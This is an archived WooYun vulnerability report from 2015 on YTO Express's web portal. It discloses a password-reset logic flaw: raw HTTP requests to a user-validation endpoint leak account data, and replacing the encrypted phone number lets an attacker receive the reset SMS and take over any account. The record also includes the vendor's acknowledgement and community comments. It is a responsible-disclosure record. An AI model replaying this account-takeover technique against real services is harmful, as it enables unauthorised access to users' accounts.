{"id": 658, "wybug_id": "wooyun-2015-0126462", "wybug_title": "快递安全之圆通任意用户密码重置(非爆破)", "wybug_corp": "圆通", "wybug_author": "harbour_bin", "wybug_date": "2015-07-13 15:24", "wybug_open_date": "2015-08-28 09:42", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-28：\t细节向公众公开  简要描述： 快递安全之圆通任意用户密码重置(非爆破) 详细说明：  1、正常的密码找回流程, 如下\nPOST /validUserByUserName.action HTTP/1.1Host: ec.yto.net.cnProxy-Connection: keep-aliveContent-Length: 32Accept: application/json, text/javascript, */*; q=0.01Origin: http://ec.yto.net.cnX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://ec.yto.net.cn/forgetPassword.actionAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: JSESSIONID=3BC2D0C5FF34B19E74A9CC792DE1FA91; CNZZDATA1253325994=77630497-1436747644-http%253A%252F%252Fec.yto.net.cn%252F%7C1436753071userName=harbour&verityCode=3507\n\n\n返回信息如下, 存在信息泄漏的问题(手机号、用户名、邮箱等信息,虽然加密, 但可能被利用,厂商注意)\nHTTP/1.1 200 OKServer: Apache-Coyote/1.1Content-Type: text/javascript;charset=UTF-8Content-Language: zh-CNContent-Length: 1142Date: Mon, 13 Jul 2015 02:54:11 GMT{\"User\":{\"deptName\":\"\",\"canceled\":\"\",\"isPrint\":\"\",\"loginTime\":null,\"remark\":\"\",\"newPassword\":\"\",\"userPassword\":\"0gOUwTRD7TnaXSB97e/Aeg==\",\"hasOnbehalfChannel\":false,\"userType\":\"4\",\"userContractList\":[],\"userState\":\"1\",\"shopAccount\":\"\",\"isSeal\":\"\",\"bindedCustomerId\":\"\",\"userLevel\":\"\",\"userName\":\"harbour\",\"addressProvince\":\"\",\"appProvider\":null,\"addressCity\":\"\",\"hasShpo\":\"\",\"userCode\":\"\",\"updateTime\":null,\"telAreaCode\":\"\",\"cardType\":\"\",\"taobaoEncodeKey\":\"\",\"clientId\":\"\",\"createUser\":\"\",\"userThreadList\":[],\"mobilePhone\":\"2803c9f5bb0b84ca6ac5781643759a0a\",\"telExtCode\":\"\",\"shopName\":\"\",\"userAuthority\":\"4\",\"userNameText\":\"d6656d2b1cb23c6254c7d8d08aadee83\",\"createTime\":\"2015-07-13 07:42:31\",\"hrCanceled\":\"\",\"sex\":\"\",\"telCode\":\"\",\"field003\":\"\",\"field002\":\"\",\"deptAddr\":\"\",\"repeatNum\":0,\"unlikefreight\":\"\",\"addressDistrict\":\"\",\"userSource\":\"0\",\"field001\":\"\",\"canChangeToContract\":\"\",\"cardNo\":\"\",\"id\":1686228,\"parentId\":\"\",\"printNav\":\"\",\"childType\":\"\",\"switchEccount\":\"0\",\"siteName\":\"\",\"dr\":\"\",\"site\":\"\",\"mail\":\"1207727511@qq.com\",\"ids\":[],\"oldPassword\":\"\",\"addressStreet\":\"\",\"telePhone\":\"\",\"deptPhone\":\"\",\"financialManager\":\"\",\"deptCode\":\"\"}}\n\n\n看到这边, 预感会有问题, 于是测试了一下, 问题的确存在, 如下2、使用测试帐号, 发送请求\n\n\nPOST /validUserByUserName.action HTTP/1.1Host: ec.yto.net.cnProxy-Connection: keep-aliveContent-Length: 31Accept: application/json, text/javascript, */*; q=0.01Origin: http://ec.yto.net.cnX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://ec.yto.net.cn/forgetPassword.actionAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: JSESSIONID=3BC2D0C5FF34B19E74A9CC792DE1FA91; CNZZDATA1253325994=77630497-1436747644-http%253A%252F%252Fec.yto.net.cn%252F%7C1436753071userName=wooyun&verityCode=3507\n2、得到返回信息后, 浏览器会再次发送修改手机号码的请求\n\n3、此处的手机号码是加密的, 就算未能明白加密规则也无所谓,替换成上文正常测试的手机号的加密字符串\n\n4、成功给我的手机发送短信, 并成功登录\n\n\n\n\n\n   漏洞证明：  已证明！   修复方案：  你们更专业！PS：邮箱部分似乎也有问题, 厂商自己检查一下吧   版权声明：转载请注明来源 harbour_bin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-07-14 09:41 厂商回复： 非常感谢，我们已经在修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-13 16:20 |    \t\t鬼见愁 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 挖洞之神)\t\t \n  圆通貌似没有账号登入吧    \n     2015-07-13 16:51 |    \t\tharbour_bin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:47        | 向TOP200进军！)\t\t \n  现在的官网有的    \n     2015-07-14 09:47 |    \t\tharbour_bin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:47        | 向TOP200进军！)\t\t \n  5rank,好吧    \n     2015-08-28 14:16 |    \t\tlightless \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:11        | HDUISA成员，被某厂坑了一波，求工作。)\t\t \n  @harbour_bin 圆通所有的洞都是5rank。。。    \n     2015-08-28 14:24 |    \t\tharbour_bin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:47        | 向TOP200进军！)\t\t \n  @lightless  WooYun: 快递安全之圆通存在越权操作两处  这个10Rank不够到手的只有2    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}